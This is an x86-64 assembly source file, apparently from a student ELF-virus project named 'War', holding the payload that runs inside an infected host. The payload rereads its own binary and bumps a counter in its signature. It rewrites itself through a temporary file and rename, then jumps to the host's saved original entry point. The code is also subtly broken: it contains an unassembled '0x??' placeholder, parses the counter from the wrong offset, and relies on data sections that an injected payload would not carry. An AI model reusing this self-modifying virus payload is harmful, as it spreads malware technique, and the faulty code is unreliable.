section .text
global _ft_payload

; ------------------------------------------------------------
; Datos
; ------------------------------------------------------------
section .data
path_self:      db "/proc/self/exe", 0
suffix_tmp:     db ".tmp", 0
firma_str:      db "War version 1.0 (c)oded Oct - 2026 by davgalle - ", 0
firma_len       equ $ - firma_str

section .bss
path_binario:   resb 1024
path_temporal:  resb 1024
buffer:         resq 1
size_binario:   resq 1
offset_firma:   resq 1
fd_orig:        resq 1
fd_tmp:         resq 1

section .text

_ft_payload:
    jmp     code_start

data_start:
new_vaddr:      dq 0xDEADBEEF
e_entry_orig:   dq 0xDEADBEEF

code_start:
    ; ------------------------------------------------------------
    ; 1. Obtener path real del binario con readlink
    ; ------------------------------------------------------------
    mov     rax, 89                 ; syscall readlink
    lea     rdi, [rel path_self]
    lea     rsi, [rel path_binario]
    mov     rdx, 1024
    syscall
    cmp     rax, 0
    jl      .restore

    ; ------------------------------------------------------------
    ; 2. Abrir binario en solo lectura
    ; ------------------------------------------------------------
    mov     rax, 2                  ; syscall open
    lea     rdi, [rel path_binario]
    xor     rsi, rsi                ; O_RDONLY
    xor     rdx, rdx
    syscall
    cmp     rax, 0
    jl      .restore
    mov     [rel fd_orig], rax

    ; ------------------------------------------------------------
    ; 3. Obtener tamaño con lseek
    ; ------------------------------------------------------------
    mov     rax, 8                  ; syscall lseek
    mov     rdi, [rel fd_orig]
    xor     rsi, rsi
    mov     rdx, 2                  ; SEEK_END
    syscall
    mov     [rel size_binario], rax

    ; ------------------------------------------------------------
    ; 4. Reservar memoria con mmap y leer el binario
    ; ------------------------------------------------------------
    mov     rax, 9                  ; syscall mmap
    xor     rdi, rdi
    mov     rsi, [rel size_binario]
    mov     rdx, 3                  ; PROT_READ | PROT_WRITE
    mov     r10, 2                  ; MAP_PRIVATE
    mov     r8, [rel fd_orig]
    xor     r9, r9
    syscall
    cmp     rax, -1
    je      .restore
    mov     [rel buffer], rax

    mov     rax, 8                  ; lseek a 0
    mov     rdi, [rel fd_orig]
    xor     rsi, rsi
    xor     rdx, rdx
    syscall

    mov     rax, 0                  ; read
    mov     rdi, [rel fd_orig]
    mov     rsi, [rel buffer]
    mov     rdx, [rel size_binario]
    syscall

    mov     rax, 3                  ; close
    mov     rdi, [rel fd_orig]
    syscall

    ; ------------------------------------------------------------
    ; 5. Buscar la firma en el buffer
    ; ------------------------------------------------------------
    mov     rdi, [rel buffer]
    mov     rcx, [rel size_binario]
    lea     rsi, [rel firma_str]
    mov     rdx, firma_len

.buscar_firma:
    cmp     rcx, rdx
    jl      .restore
    push    rdi
    push    rcx
    mov     rcx, rdx
    repe    cmpsb
    pop     rcx
    pop     rdi
    je      .firma_encontrada
    inc     rdi
    dec     rcx
    jmp     .buscar_firma

.firma_encontrada:
    ; rdi apunta al inicio del número (después de la firma)
    mov     [rel offset_firma], rdi

    ; ------------------------------------------------------------
    ; 6. Modificar el número en el buffer
    ; ------------------------------------------------------------
    ; Convertir string a número
    xor     r13, r13
    mov     rcx, 5
.conv_num:
    movzx   eax, byte [rdi]
    sub     eax, '0'
    imul    r13, r13, 10
    add     r13, rax
    inc     rdi
    loop    .conv_num

    inc     r13                     ; incrementar

    ; Convertir número a string (5 dígitos)
    mov     rax, r13
    mov     rdi, [rel offset_firma]
    add     rdi, 4
    mov     rcx, 5
.conv_str:
    xor     rdx, rdx
    mov     r8, 10
    div     r8
    add     dl, '0'
    mov     [rdi], dl
    dec     rdi
    loop    .conv_str

    ; ------------------------------------------------------------
    ; 7. Crear path temporal (path_binario + ".tmp")
    ; ------------------------------------------------------------
    lea     rdi, [rel path_temporal]
    lea     rsi, [rel path_binario]
    call    ft_strcpy
    lea     rsi, [rel suffix_tmp]
    call    ft_strcat

    ; ------------------------------------------------------------
    ; 8. Abrir temporal y escribir el binario modificado
    ; ------------------------------------------------------------
    mov     rax, 2                  ; open
    lea     rdi, [rel path_temporal]
    mov     rsi, 0x241              ; O_WRONLY | O_CREAT | O_TRUNC
    mov     rdx, 0755
    syscall
    cmp     rax, 0
    jl      .restore
    mov     [rel fd_tmp], rax

    mov     rax, 1                  ; write
    mov     rdi, [rel fd_tmp]
    mov     rsi, [rel buffer]
    mov     rdx, [rel size_binario]
    syscall

    mov     rax, 74                 ; fsync
    mov     rdi, [rel fd_tmp]
    syscall

    mov     rax, 3                  ; close
    mov     rdi, [rel fd_tmp]
    syscall

    ; ------------------------------------------------------------
    ; 9. Rename temporal sobre el original
    ; ------------------------------------------------------------
    mov     rax, 82                 ; syscall rename
    lea     rdi, [rel path_temporal]
    lea     rsi, [rel path_binario]
    syscall

    ; ------------------------------------------------------------
    ; 10. Saltar a e_entry_orig
    ; ------------------------------------------------------------
.restore:
    ; Calcular base = rbx - new_vaddr
    call    .get_base
.get_base:
    pop     rbx
    sub     rbx, 0x??               ; offset de next - _ft_payload
    mov     r12, [rbx + 2]          ; new_vaddr
    mov     r15, [rbx + 10]         ; e_entry_orig
    mov     rax, rbx
    sub     rax, r12
    add     rax, r15
    jmp     rax

; ------------------------------------------------------------
; Funciones auxiliares (strcpy, strcat)
; ------------------------------------------------------------
ft_strcpy:
    ; rdi = dest, rsi = src
.loop:
    mov     al, [rsi]
    mov     [rdi], al
    test    al, al
    jz      .done
    inc     rdi
    inc     rsi
    jmp     .loop
.done:
    ret

ft_strcat:
    ; rdi = dest, rsi = src
.find_end:
    cmp     byte [rdi], 0
    je      .copy
    inc     rdi
    jmp     .find_end
.copy:
    mov     al, [rsi]
    mov     [rdi], al
    test    al, al
    jz      .done
    inc     rdi
    inc     rsi
    jmp     .copy
.done:
    ret